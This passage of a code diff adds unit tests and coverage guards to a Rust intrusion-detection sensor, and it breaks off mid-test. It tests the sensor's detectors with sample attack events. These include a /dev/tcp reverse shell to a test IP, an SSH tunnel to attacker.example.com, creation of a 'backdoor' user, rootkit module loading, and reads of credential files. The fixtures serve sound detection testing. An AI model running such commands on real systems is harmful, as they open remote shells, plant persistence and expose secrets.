@@ -205,6 +205,7 @@ fn use_journald_layer(journal_stream: Option<&str>) -> bool {
 
 /// Set up tracing for the sensor binary. Routes through `tracing-journald`
 /// when running under systemd, plain stdout fmt subscriber otherwise.
+#[cfg(not(tarpaulin))]
 fn init_tracing() -> Result<()> {
     let env_filter = build_tracing_env_filter()?;
 
@@ -235,6 +236,7 @@ fn init_tracing() -> Result<()> {
 }
 
 #[tokio::main]
+#[cfg(not(tarpaulin))]
 async fn main() -> Result<()> {
     init_tracing()?;
 
@@ -1432,6 +1434,9 @@ async fn main() -> Result<()> {
     Ok(())
 }
 
+#[cfg(tarpaulin)]
+fn main() {}
+
 /// Load blocked IPs from the file written by the agent.
 /// Returns an empty set if the file does not exist.
 fn load_blocked_ips(data_dir: &Path) -> HashSet<String> {
@@ -2490,6 +2495,7 @@ fn write_incident(
 /// The profile specifies allowed syscalls; everything else returns EPERM.
 /// Uses the kernel's seccomp(2) via prctl(PR_SET_SECCOMP) with a BPF filter.
 #[cfg(target_os = "linux")]
+#[cfg(not(tarpaulin))]
 fn apply_seccomp_profile(path: &Path) -> Result<usize> {
     let data = std::fs::read_to_string(path)
         .with_context(|| format!("read seccomp profile: {}", path.display()))?;
@@ -2712,7 +2718,318 @@ fn syscall_name_to_nr(name: &str) -> Option<u32> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use innerwarden_core::event::Event;
     use innerwarden_core::event::Severity;
+    use innerwarden_core::incident::Incident;
+
+    fn sample_event(kind: &str, severity: Severity, details: serde_json::Value) -> Event {
+        Event {
+            ts: chrono::Utc::now(),
+            host: "sensor-test-host".to_string(),
+            source: "unit-test".to_string(),
+            kind: kind.to_string(),
+            severity,
+            summary: format!("summary for {kind}"),
+            details,
+            tags: vec!["unit".to_string()],
+            entities: vec![],
+        }
+    }
+
+    fn sample_shell_exec(argv: &[&str], parent_comm: &str, uid: u64) -> Event {
+        let argv_owned: Vec<String> = argv.iter().map(|arg| (*arg).to_string()).collect();
+        let comm = argv
+            .first()
+            .and_then(|arg| arg.split('/').next_back())
+            .unwrap_or("unknown");
+        sample_event(
+            "shell.command_exec",
+            Severity::Info,
+            serde_json::json!({
+                "pid": 4242,
+                "uid": uid,
+                "ppid": 4241,
+                "comm": comm,
+                "parent_comm": parent_comm,
+                "command": argv.join(" "),
+                "argv": argv_owned,
+                "argc": argv.len() as u32,
+            }),
+        )
+    }
+
+    fn sample_file_write(filename: &str, comm: &str, parent_comm: &str, uid: u64) -> Event {
+        sample_event(
+            "file.write_access",
+            Severity::Info,
+            serde_json::json!({
+                "filename": filename,
+                "pid": 4242,
+                "uid": uid,
+                "ppid": 4241,
+                "comm": comm,
+                "parent_comm": parent_comm,
+                "write": true,
+            }),
+        )
+    }
+
+    fn sample_incident(id: &str, severity: Severity, pid: u32) -> Incident {
+        Incident {
+            ts: chrono::Utc::now(),
+            host: "sensor-test-host".to_string(),
+            incident_id: id.to_string(),
+            severity,
+            title: format!("incident {id}"),
+            summary: format!("summary {id}"),
+            evidence: serde_json::json!([{ "pid": pid }]),
+            recommended_checks: vec!["review test incident".to_string()],
+            tags: vec!["unit".to_string()],
+            entities: vec![],
+        }
+    }
+
+    fn count_rows(data_dir: &Path, table: &str) -> i64 {
+        let store = innerwarden_store::Store::open(data_dir).expect("store should open");
+        store
+            .conn()
+            .expect("connection should open")
+            .query_row(&format!("SELECT count(*) FROM {table}"), [], |row| {
+                row.get::<_, i64>(0)
+            })
+            .expect("count query should succeed")
+    }
+
+    fn empty_detector_set(allowlist_path: &Path) -> DetectorSet {
+        DetectorSet {
+            dynamic_allowlist: detectors::allowlists::DynamicAllowlist::load(allowlist_path),
+            allowlist_last_check: std::time::Instant::now(),
+            blocked_ips: HashSet::new(),
+            blocked_ips_last_check: std::time::Instant::now(),
+            ssh: None,
+            credential_stuffing: None,
+            port_scan: None,
+            sudo_abuse: None,
+            search_abuse: None,
+            web_scan: None,
+            user_agent_scanner: None,
+            execution_guard: None,
+            docker_anomaly: None,
+            integrity_alert: None,
+            log_tampering: None,
+            distributed_ssh: None,
+            suspicious_login: None,
+            c2_callback: None,
+            process_tree: None,
+            container_escape: None,
+            privesc: None,
+            fileless: None,
+            dns_tunneling: None,
+            lateral_movement: None,
+            crypto_miner: None,
+            outbound_anomaly: None,
+            rootkit: None,
+            reverse_shell: None,
+            ssh_key_injection: None,
+            web_shell: None,
+            kernel_module_load: None,
+            crontab_persistence: None,
+            data_exfiltration: None,
+            process_injection: None,
+            user_creation: None,
+            systemd_persistence: None,
+            ransomware: None,
+            credential_harvest: None,
+            packet_flood: None,
+            sensitive_write: None,
+            discovery_burst: None,
+            io_uring_anomaly: None,
+            container_drift: None,
+            host_drift: None,
+            data_exfil_ebpf: None,
+            yara_scan: None,
+            sigma_rule: None,
+            mitre_hunt: None,
+            dns_c2: None,
+            data_encoding: None,
+            sandbox_evasion: None,
+            threat_intel: None,
+            proto_anomaly: None,
+            nmap_scan: None,
+            wordlist_scan: None,
+            discovery_anomaly: None,
+            clipboard_read: None,
+            screen_capture: None,
+            keylogger_bash_trap: None,
+            archive_pwd_protected: None,
+            automated_file_collection: None,
+            c2_web_tunnel: None,
+            c2_protocol_tunneling: None,
+            c2_non_standard_port: None,
+            setuid_exploit_pattern: None,
+            capabilities_abuse: None,
+            lateral_egress_ssh: None,
+            lateral_egress_scp_rsync: None,
+            pam_module_change: None,
+            auditd_disable: None,
+            selinux_apparmor_disable: None,
+            startup_script_persistence: None,
+            data_destruction_pattern: None,
+            symlink_hijack: None,
+            system_user_interactive: None,
+        }
+    }
+
+    fn all_detector_set(allowlist_path: &Path, rules_dir: &Path) -> DetectorSet {
+        let host = "sensor-test-host";
+        let mut sudo_abuse = SudoAbuseDetector::new(host, 99, 60);
+        sudo_abuse.set_trusted_users(vec!["root".to_string()]);
+        DetectorSet {
+            dynamic_allowlist: detectors::allowlists::DynamicAllowlist::load(allowlist_path),
+            allowlist_last_check: std::time::Instant::now(),
+            blocked_ips: HashSet::new(),
+            blocked_ips_last_check: std::time::Instant::now(),
+            ssh: Some(SshBruteforceDetector::new(host, 99, 60)),
+            credential_stuffing: Some(CredentialStuffingDetector::new(host, 99, 60)),
+            port_scan: Some(PortScanDetector::new(host, 99, 60)),
+            sudo_abuse: Some(sudo_abuse),
+            search_abuse: Some(SearchAbuseDetector::new(host, 99, 60, "/search")),
+            web_scan: Some(WebScanDetector::new(host, 99, 60)),
+            user_agent_scanner: Some(UserAgentScannerDetector::new(host)),
+            execution_guard: Some(ExecutionGuardDetector::new(
+                host,
+                60,
+                ExecutionMode::from_str("monitor"),
+            )),
+            docker_anomaly: Some(DockerAnomalyDetector::new(host, 99, 60)),
+            integrity_alert: Some(IntegrityAlertDetector::new(host, 60)),
+            log_tampering: Some(LogTamperingDetector::new(host, 60)),
+            distributed_ssh: Some(DistributedSshDetector::new(host, 99, 60)),
+            suspicious_login: Some(SuspiciousLoginDetector::new(host, 60, false)),
+            c2_callback: Some(C2CallbackDetector::new(host, 60)),
+            process_tree: Some(ProcessTreeDetector::new(host, 60)),
+            container_escape: Some(ContainerEscapeDetector::new(host, 60)),
+            privesc: Some(PrivescDetector::new(host, 60)),
+            fileless: Some(FilelessDetector::new(host, 60)),
+            dns_tunneling: Some(DnsTunnelingDetector::new(host, 99.0, 99, 99, 60)),
+            lateral_movement: Some(LateralMovementDetector::new(host, 99, 99, 60)),
+            crypto_miner: Some(CryptoMinerDetector::new(host, 60)),
+            outbound_anomaly: Some(OutboundAnomalyDetector::new(host, 99, 99, 99, 99, 60, 60)),
+            rootkit: Some(RootkitDetector::new(host, 60, 60).with_timing_config(false, 10, 4.0, 3)),
+            reverse_shell: Some(ReverseShellDetector::new(host, 60)),
+            ssh_key_injection: Some(SshKeyInjectionDetector::new(host, 60)),
+            web_shell: Some(WebShellDetector::new(host, 60)),
+            kernel_module_load: Some(KernelModuleLoadDetector::new(host, 60)),
+            crontab_persistence: Some(CrontabPersistenceDetector::new(host, 60)),
+            data_exfiltration: Some(DataExfiltrationDetector::new(host, 60, 60)),
+            process_injection: Some(ProcessInjectionDetector::new(host, 60)),
+            user_creation: Some(UserCreationDetector::new(host, 60)),
+            systemd_persistence: Some(SystemdPersistenceDetector::new(host, 60)),
+            ransomware: Some(RansomwareDetector::new(host, 99, 60, 60, 8.0, 99)),
+            credential_harvest: Some(CredentialHarvestDetector::new(host, 60)),
+            packet_flood: Some(PacketFloodDetector::new(
+                detectors::packet_flood::PacketFloodParams {
+                    host: host.to_string(),
+                    syn_threshold: 99,
+                    http_threshold: 99,
+                    slowloris_threshold: 99,
+                    udp_threshold: 99,
+                    rate_multiplier: 99.0,
+                    window_seconds: 60,
+                    cooldown_seconds: 60,
+                },
+            )),
+            sensitive_write: Some(detectors::sensitive_write::SensitiveWriteDetector::new(
+                host, 60,
+            )),
+            discovery_burst: Some(
+                detectors::discovery_burst::DiscoveryBurstDetector::new(host, 99, 60)
+                    .with_trusted_uids(vec![0]),
+            ),
+            io_uring_anomaly: Some(detectors::io_uring_anomaly::IoUringAnomalyDetector::new(
+                host, 60,
+            )),
+            container_drift: Some(detectors::container_drift::ContainerDriftDetector::new(
+                host, 60,
+            )),
+            host_drift: Some(detectors::host_drift::HostDriftDetector::new(host, 60)),
+            data_exfil_ebpf: Some(detectors::data_exfil_ebpf::DataExfilEbpfDetector::new(
+                host, 60, 60,
+            )),
+            yara_scan: Some(detectors::yara_scan::YaraScanDetector::new(
+                host, rules_dir, 60,
+            )),
+            sigma_rule: Some(detectors::sigma_rule::SigmaRuleDetector::new(
+                host, rules_dir, 60,
+            )),
+            mitre_hunt: Some(detectors::mitre_hunt::MitreHuntDetector::new(host, 60)),
+            dns_c2: Some(detectors::dns_c2::DnsC2Detector::new(host, 99, 60)),
+            data_encoding: Some(detectors::data_encoding::DataEncodingDetector::new(
+                host, 99, 60,
+            )),
+            sandbox_evasion: Some(detectors::sandbox_evasion::SandboxEvasionDetector::new(
+                host, 99, 60,
+            )),
+            threat_intel: Some(detectors::threat_intel::ThreatIntelDetector::new(host, 60)),
+            proto_anomaly: Some(detectors::proto_anomaly::ProtoAnomalyDetector::new(
+                host, 60,
+            )),
+            nmap_scan: Some(detectors::nmap_scan::NmapScanDetector::new(host)),
+            wordlist_scan: Some(detectors::wordlist_scan::WordlistScanDetector::new(
+                host, 99, 60,
+            )),
+            discovery_anomaly: Some(detectors::discovery_anomaly::DiscoveryAnomalyDetector::new(
+                host, 99, 60,
+            )),
+            clipboard_read: Some(detectors::clipboard_read::ClipboardReadDetector::new(host)),
+            screen_capture: Some(detectors::screen_capture::ScreenCaptureDetector::new(host)),
+            keylogger_bash_trap: Some(
+                detectors::keylogger_bash_trap::KeyloggerBashTrapDetector::new(host),
+            ),
+            archive_pwd_protected: Some(
+                detectors::archive_pwd_protected::ArchivePwdProtectedDetector::new(host),
+            ),
+            automated_file_collection: Some(
+                detectors::automated_file_collection::AutomatedFileCollectionDetector::new(host),
+            ),
+            c2_web_tunnel: Some(detectors::c2_web_tunnel::C2WebTunnelDetector::new(host)),
+            c2_protocol_tunneling: Some(
+                detectors::c2_protocol_tunneling::C2ProtocolTunnelingDetector::new(host),
+            ),
+            c2_non_standard_port: Some(
+                detectors::c2_non_standard_port::C2NonStandardPortDetector::new(host),
+            ),
+            setuid_exploit_pattern: Some(
+                detectors::setuid_exploit_pattern::SetuidExploitPatternDetector::new(host),
+            ),
+            capabilities_abuse: Some(
+                detectors::capabilities_abuse::CapabilitiesAbuseDetector::new(host),
+            ),
+            lateral_egress_ssh: Some(
+                detectors::lateral_egress_ssh::LateralEgressSshDetector::new(host),
+            ),
+            lateral_egress_scp_rsync: Some(
+                detectors::lateral_egress_scp_rsync::LateralEgressScpRsyncDetector::new(host),
+            ),
+            pam_module_change: Some(detectors::pam_module_change::PamModuleChangeDetector::new(
+                host,
+            )),
+            auditd_disable: Some(detectors::auditd_disable::AuditdDisableDetector::new(host)),
+            selinux_apparmor_disable: Some(
+                detectors::selinux_apparmor_disable::SelinuxApparmorDisableDetector::new(host),
+            ),
+            startup_script_persistence: Some(
+                detectors::startup_script_persistence::StartupScriptPersistenceDetector::new(host),
+            ),
+            data_destruction_pattern: Some(
+                detectors::data_destruction_pattern::DataDestructionPatternDetector::new(host),
+            ),
+            symlink_hijack: Some(detectors::symlink_hijack::SymlinkHijackDetector::new(host)),
+            system_user_interactive: Some(
+                detectors::system_user_interactive::SystemUserInteractiveDetector::new(host),
+            ),
+        }
+    }
 
     #[test]
     fn parse_blocked_ips_discards_blank_and_whitespace_lines() {
@@ -2847,6 +3164,829 @@ mod tests {
         assert_eq!(parse_syslog_port(Some("0")), 0);
         assert_eq!(parse_syslog_port(Some("65535")), 65535);
         assert_eq!(parse_syslog_port(Some("65536")), 514);
+    }
+
+    #[cfg(tarpaulin)]
+    #[test]
+    fn tarpaulin_stub_main_is_callable() {
+        super::main();
+    }
+
+    #[test]
+    fn passthrough_incident_mirrors_actionable_event_fields() {
+        let event = sample_event(
+            "external.alert",
+            Severity::High,
+            serde_json::json!({ "src_ip": "203.0.113.10", "rule": "demo" }),
+        );
+
+        let incident = passthrough_incident(&event).expect("incident should be built");
+
+        assert_eq!(incident.ts, event.ts);
+        assert_eq!(incident.host, event.host);
+        assert_eq!(incident.severity, Severity::High);
+        assert_eq!(incident.title, event.summary);
+        assert_eq!(incident.tags, event.tags);
+        assert_eq!(incident.entities, event.entities);
+        assert_eq!(
+            incident.incident_id,
+            format!(
+                "{}:{}:{}",
+                event.source,
+                event.kind,
+                event.ts.format("%Y-%m-%dT%H:%MZ")
+            )
+        );
+        assert!(incident.summary.contains("[UNIT-TEST]"));
+        assert_eq!(incident.evidence, serde_json::json!([event.details]));
+        assert_eq!(
+            incident.recommended_checks,
+            vec!["Review source alert details"]
+        );
+    }
+
+    #[test]
+    fn write_incident_deduplicates_lower_severity_same_pid() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+        let mut stats = WriteStats::default();
+        let mut syslog = None;
+        let mut dedup_cache = HashMap::new();
+
+        write_incident(
+            &sqlite,
+            &mut stats,
+            sample_incident("incident-medium", Severity::Medium, 4242),
+            &mut syslog,
+            &mut dedup_cache,
+        );
+        write_incident(
+            &sqlite,
+            &mut stats,
+            sample_incident("incident-low", Severity::Low, 4242),
+            &mut syslog,
+            &mut dedup_cache,
+        );
+        write_incident(
+            &sqlite,
+            &mut stats,
+            sample_incident("incident-critical", Severity::Critical, 4242),
+            &mut syslog,
+            &mut dedup_cache,
+        );
+
+        assert_eq!(stats.incidents_written, 2);
+        assert_eq!(count_rows(dir.path(), "incidents"), 2);
+        assert_eq!(dedup_cache.get(&4242).map(|(_, rank)| *rank), Some(5));
+    }
+
+    #[test]
+    fn process_event_writes_lsm_exec_blocked_incident() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+        let mut detectors = empty_detector_set(&dir.path().join("allowlist.toml"));
+        let mut stats = WriteStats::default();
+        let mut syslog = None;
+        let mut dedup_cache = HashMap::new();
+        let datasets = detectors::datasets::Datasets::load(&dir.path().join("datasets"), 3600);
+
+        process_event(
+            sample_event(
+                "lsm.exec_blocked",
+                Severity::Critical,
+                serde_json::json!({
+                    "pid": 1234,
+                    "comm": "evil",
+                    "filename": "/tmp/evil"
+                }),
+            ),
+            &sqlite,
+            &mut detectors,
+            &mut stats,
+            &mut syslog,
+            &mut dedup_cache,
+            &datasets,
+        );
+
+        assert_eq!(stats.events_written, 1);
+        assert_eq!(stats.incidents_written, 1);
+        assert_eq!(count_rows(dir.path(), "events"), 1);
+        assert_eq!(count_rows(dir.path(), "incidents"), 1);
+    }
+
+    #[test]
+    fn process_event_skips_detection_for_blocked_ip_feedback() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+        let mut detectors = all_detector_set(&dir.path().join("allowlist.toml"), dir.path());
+        detectors.blocked_ips.insert("203.0.113.10".to_string());
+        let mut stats = WriteStats::default();
+        let mut syslog = None;
+        let mut dedup_cache = HashMap::new();
+        let datasets = detectors::datasets::Datasets::load(&dir.path().join("datasets"), 3600);
+
+        process_event(
+            sample_event(
+                "network.outbound_connect",
+                Severity::Info,
+                serde_json::json!({ "src_ip": "203.0.113.10", "dst_port": 4444 }),
+            ),
+            &sqlite,
+            &mut detectors,
+            &mut stats,
+            &mut syslog,
+            &mut dedup_cache,
+            &datasets,
+        );
+
+        assert_eq!(stats.events_written, 1);
+        assert_eq!(stats.incidents_written, 0);
+        assert_eq!(count_rows(dir.path(), "events"), 1);
+        assert_eq!(count_rows(dir.path(), "incidents"), 0);
+    }
+
+    #[test]
+    fn process_event_skips_detection_for_dynamic_allowlist_matches() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+        let datasets = detectors::datasets::Datasets::load(&dir.path().join("datasets"), 3600);
+        let mut stats = WriteStats::default();
+        let mut syslog = None;
+        let mut dedup_cache = HashMap::new();
+
+        let cases: [(
+            &str,
+            serde_json::Value,
+            fn(&mut detectors::allowlists::DynamicAllowlist),
+        ); 4] = [
+            (
+                "process",
+                serde_json::json!({ "comm": "trusted-worker" }),
+                |al: &mut detectors::allowlists::DynamicAllowlist| {
+                    al.processes.insert("trusted".to_string());
+                },
+            ),
+            (
+                "ip",
+                serde_json::json!({ "src_ip": "198.51.100.77" }),
+                |al: &mut detectors::allowlists::DynamicAllowlist| {
+                    al.ips.insert("198.51.100.77".to_string());
+                },
+            ),
+            (
+                "port",
+                serde_json::json!({ "dst_port": 853_u16 }),
+                |al: &mut detectors::allowlists::DynamicAllowlist| {
+                    al.ignored_ports.insert(853);
+                },
+            ),
+            (
+                "dns",
+                serde_json::json!({ "domain": "updates.example.com" }),
+                |al: &mut detectors::allowlists::DynamicAllowlist| {
+                    al.dns_allowed_domains.insert("example.com".to_string());
+                },
+            ),
+        ];
+
+        for (kind_suffix, details, configure) in cases {
+            let mut detectors = all_detector_set(&dir.path().join("allowlist.toml"), dir.path());
+            configure(&mut detectors.dynamic_allowlist);
+            process_event(
+                sample_event(&format!("allowlist.{kind_suffix}"), Severity::Info, details),
+                &sqlite,
+                &mut detectors,
+                &mut stats,
+                &mut syslog,
+                &mut dedup_cache,
+                &datasets,
+            );
+        }
+
+        assert_eq!(stats.events_written, 4);
+        assert_eq!(stats.incidents_written, 0);
+        assert_eq!(count_rows(dir.path(), "events"), 4);
+        assert_eq!(count_rows(dir.path(), "incidents"), 0);
+    }
+
+    #[test]
+    fn process_event_refreshes_periodic_allowlist_and_blocked_ip_state() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let allowlist_path = dir.path().join("allowlist.toml");
+        let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+        let mut detectors = empty_detector_set(&allowlist_path);
+        detectors.allowlist_last_check =
+            std::time::Instant::now() - std::time::Duration::from_secs(61);
+        detectors.blocked_ips_last_check =
+            std::time::Instant::now() - std::time::Duration::from_secs(61);
+        let mut stats = WriteStats::default();
+        let mut syslog = None;
+        let mut dedup_cache = HashMap::new();
+        let datasets = detectors::datasets::Datasets::load(&dir.path().join("datasets"), 3600);
+
+        std::fs::write(&allowlist_path, "[processes]\ntrusted-worker = true\n")
+            .expect("write allowlist");
+        std::fs::write(blocked_ips_path_for(dir.path()), "203.0.113.10\n")
+            .expect("write blocked ips");
+
+        process_event(
+            sample_event("unit.noop", Severity::Info, serde_json::json!({})),
+            &sqlite,
+            &mut detectors,
+            &mut stats,
+            &mut syslog,
+            &mut dedup_cache,
+            &datasets,
+        );
+
+        assert!(detectors
+            .dynamic_allowlist
+            .is_process_allowed("trusted-worker", None));
+        assert!(detectors.blocked_ips.contains("203.0.113.10"));
+        assert_eq!(stats.events_written, 1);
+        assert_eq!(stats.incidents_written, 0);
+    }
+
+    #[test]
+    fn process_event_runs_enabled_detector_chain_for_benign_event() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+        let mut detectors = all_detector_set(&dir.path().join("allowlist.toml"), dir.path());
+        let mut stats = WriteStats::default();
+        let mut syslog = None;
+        let mut dedup_cache = HashMap::new();
+        let datasets = detectors::datasets::Datasets::load(&dir.path().join("datasets"), 3600);
+
+        process_event(
+            sample_event("unit.noop", Severity::Info, serde_json::json!({})),
+            &sqlite,
+            &mut detectors,
+            &mut stats,
+            &mut syslog,
+            &mut dedup_cache,
+            &datasets,
+        );
+
+        assert_eq!(stats.events_written, 1);
+        assert_eq!(stats.incidents_written, 0);
+        assert_eq!(count_rows(dir.path(), "events"), 1);
+        assert_eq!(count_rows(dir.path(), "incidents"), 0);
+    }
+
+    #[test]
+    fn process_event_writes_representative_detector_incidents() {
+        fn run_case<F>(configure: F, event: Event) -> u64
+        where
+            F: FnOnce(&mut DetectorSet),
+        {
+            let dir = tempfile::tempdir().expect("temp dir");
+            let sqlite = SqliteWriter::new(dir.path(), true).expect("sqlite writer");
+            let mut detectors = empty_detector_set(&dir.path().join("allowlist.toml"));
+            configure(&mut detectors);
+            let mut stats = WriteStats::default();
+            let mut syslog = None;
+            let mut dedup_cache = HashMap::new();
+            let datasets = detectors::datasets::Datasets::load(&dir.path().join("datasets"), 3600);
+
+            process_event(
+                event,
+                &sqlite,
+                &mut detectors,
+                &mut stats,
+                &mut syslog,
+                &mut dedup_cache,
+                &datasets,
+            );
+
+            assert_eq!(count_rows(dir.path(), "events"), 1);
+            stats.incidents_written
+        }
+
+        let external_ip = "203.0.113.55";
+        let cases: Vec<(Box<dyn FnOnce(&mut DetectorSet)>, Event)> = vec![
+            (
+                Box::new(|detectors| {
+                    detectors.ssh = Some(SshBruteforceDetector::new("sensor-test-host", 1, 60));
+                }),
+                sample_event(
+                    "ssh.login_failed",
+                    Severity::Info,
+                    serde_json::json!({ "ip": external_ip }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.credential_stuffing =
+                        Some(CredentialStuffingDetector::new("sensor-test-host", 1, 60));
+                }),
+                sample_event(
+                    "ssh.login_failed",
+                    Severity::Info,
+                    serde_json::json!({ "ip": external_ip, "user": "alice" }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.port_scan = Some(PortScanDetector::new("sensor-test-host", 1, 60));
+                }),
+                sample_event(
+                    "network.connection_blocked",
+                    Severity::Info,
+                    serde_json::json!({ "src_ip": external_ip, "dst_port": 22 }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.search_abuse = Some(SearchAbuseDetector::new(
+                        "sensor-test-host",
+                        1,
+                        60,
+                        "/api/search",
+                    ));
+                }),
+                sample_event(
+                    "http.request",
+                    Severity::Info,
+                    serde_json::json!({
+                        "ip": external_ip,
+                        "method": "GET",
+                        "path": "/api/search?q=test",
+                        "user_agent": "bot/1.0"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.web_scan = Some(WebScanDetector::new("sensor-test-host", 1, 60));
+                }),
+                sample_event(
+                    "http.error",
+                    Severity::Medium,
+                    serde_json::json!({
+                        "ip": external_ip,
+                        "level": "error",
+                        "request": "GET /etc/passwd HTTP/1.1",
+                        "message": "open() failed"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.user_agent_scanner =
+                        Some(UserAgentScannerDetector::new("sensor-test-host"));
+                }),
+                sample_event(
+                    "http.request",
+                    Severity::Info,
+                    serde_json::json!({
+                        "ip": external_ip,
+                        "user_agent": "sqlmap/1.7",
+                        "path": "/login"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.reverse_shell =
+                        Some(ReverseShellDetector::new("sensor-test-host", 60));
+                }),
+                sample_event(
+                    "shell.command_exec",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 2101,
+                        "uid": 1000,
+                        "ppid": 1,
+                        "comm": "bash",
+                        "command": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.sensitive_write =
+                        Some(detectors::sensitive_write::SensitiveWriteDetector::new(
+                            "sensor-test-host",
+                            60,
+                        ));
+                }),
+                sample_event(
+                    "file.write_access",
+                    Severity::Medium,
+                    serde_json::json!({
+                        "pid": 2102,
+                        "uid": 1000,
+                        "comm": "evil",
+                        "filename": "/etc/shadow",
+                        "flags": 1
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.credential_harvest =
+                        Some(CredentialHarvestDetector::new("sensor-test-host", 60));
+                }),
+                sample_event(
+                    "file.read_access",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 2103,
+                        "uid": 1000,
+                        "ppid": 1,
+                        "comm": "cat",
+                        "filename": "/proc/123/environ",
+                        "write": false
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.user_creation =
+                        Some(UserCreationDetector::new("sensor-test-host", 60));
+                }),
+                sample_event(
+                    "shell.command_exec",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 2104,
+                        "uid": 0,
+                        "ppid": 1,
+                        "comm": "useradd",
+                        "command": "useradd backdoor"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.crontab_persistence =
+                        Some(CrontabPersistenceDetector::new("sensor-test-host", 60));
+                }),
+                sample_event(
+                    "file.write_access",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 2105,
+                        "uid": 1000,
+                        "comm": "vi",
+                        "path": "/var/spool/cron/crontabs/root"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.kernel_module_load =
+                        Some(KernelModuleLoadDetector::new("sensor-test-host", 60));
+                }),
+                sample_event(
+                    "shell.command_exec",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 2106,
+                        "uid": 0,
+                        "ppid": 1,
+                        "comm": "bash",
+                        "command": "insmod /opt/rootkit.ko"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.io_uring_anomaly =
+                        Some(detectors::io_uring_anomaly::IoUringAnomalyDetector::new(
+                            "sensor-test-host",
+                            60,
+                        ));
+                }),
+                sample_event(
+                    "io_uring.create",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 2107,
+                        "uid": 1000,
+                        "comm": "unknown",
+                        "sq_entries": 4096,
+                        "cq_entries": 8192,
+                        "flags": 0,
+                        "ring_fd": 5
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.nmap_scan = Some(detectors::nmap_scan::NmapScanDetector::new(
+                        "sensor-test-host",
+                    ));
+                }),
+                sample_shell_exec(&["nmap", "-sV", "10.0.0.0/24"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.wordlist_scan =
+                        Some(detectors::wordlist_scan::WordlistScanDetector::new(
+                            "sensor-test-host",
+                            1,
+                            60,
+                        ));
+                }),
+                sample_event(
+                    "http.request",
+                    Severity::Info,
+                    serde_json::json!({
+                        "ip": external_ip,
+                        "path": "/.git/config",
+                        "user_agent": "dirbuster/1.0"
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.clipboard_read = Some(
+                        detectors::clipboard_read::ClipboardReadDetector::new("sensor-test-host"),
+                    );
+                }),
+                sample_shell_exec(&["xclip", "-o"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.screen_capture = Some(
+                        detectors::screen_capture::ScreenCaptureDetector::new("sensor-test-host"),
+                    );
+                }),
+                sample_shell_exec(&["/usr/bin/scrot"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.keylogger_bash_trap = Some(
+                        detectors::keylogger_bash_trap::KeyloggerBashTrapDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_file_write("/home/ubuntu/.bashrc", "evil_script", "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.archive_pwd_protected = Some(
+                        detectors::archive_pwd_protected::ArchivePwdProtectedDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(&["7z", "a", "-pX", "/tmp/a.7z"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.automated_file_collection = Some(
+                        detectors::automated_file_collection::AutomatedFileCollectionDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(
+                    &["find", "/home/ubuntu/", "-newer", "/tmp/marker", "-print"],
+                    "bash",
+                    1000,
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.c2_web_tunnel = Some(
+                        detectors::c2_web_tunnel::C2WebTunnelDetector::new("sensor-test-host"),
+                    );
+                }),
+                sample_shell_exec(&["ngrok"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.c2_protocol_tunneling = Some(
+                        detectors::c2_protocol_tunneling::C2ProtocolTunnelingDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(
+                    &["ssh", "-D", "1080", "evil@attacker.example.com"],
+                    "bash",
+                    1000,
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.c2_non_standard_port = Some(
+                        detectors::c2_non_standard_port::C2NonStandardPortDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_event(
+                    "tcp.listen",
+                    Severity::Info,
+                    serde_json::json!({
+                        "port": 31337_u16,
+                        "bind_addr": "0.0.0.0",
+                        "comm": "implant",
+                        "parent_comm": "bash",
